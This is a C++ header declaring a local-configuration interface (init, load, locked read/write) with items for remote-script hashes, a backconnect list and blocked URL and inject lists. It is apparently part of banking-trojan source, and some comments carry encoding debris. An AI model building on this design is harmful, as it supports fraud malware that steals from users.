/*
  Работа с локальной конфигурацией.
*/
#pragma once

#include "..\common\binstorage.h"

namespace LocalConfig
{
  //List of elements of the local configuration.
  enum
  {
    ITEM_REMOTESCRIPT_HASH      = 1, //An array of binary MD5.
    ITEM_BACKCONNECT_LIST       = 2, //Multistroka ANSI.
    ITEM_URLLIST_BLOCKED        = 3, //Multistroka ANSI.
    ITEM_URLLIST_BLOCKEDINJECTS = 4  //Multistroka ANSI.
  };
  
  /*
    Инициализация.
  */
  void init(void);
  
  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Загрузка текущей конфигурации в память процесса.

    Return - указатель на конфиг(необходимо освободить через Mem), или NULL в случаи ошибки.
  */
  BinStorage::STORAGE *getCurrent(void);

  /*
    Получение текущей конфигурации с блокировкой доступа для других потоков и процессов.

    Return - указатель на конфиг(необходимо освободить через Mem), или NULL в случаи ошибки.
  */
  BinStorage::STORAGE *beginReadWrite(void);

  /*В В В В Unlock established beginReadWrite () and save the changes.

В В В В IN OUT binStorage - configuration for the conservation, preservation, or NULL if not required. At the exit
В В В В В В В В В В В В В В В В В В В В В В В В buffer content is not suitable for use.
В В В В 
В В В В Return - true - the configuration has been saved,
В В В В В В В В В В В В В В В В В В В В В В В В false - config is not saved.
В В */
  bool endReadWrite(BinStorage::STORAGE *binStorage);
};
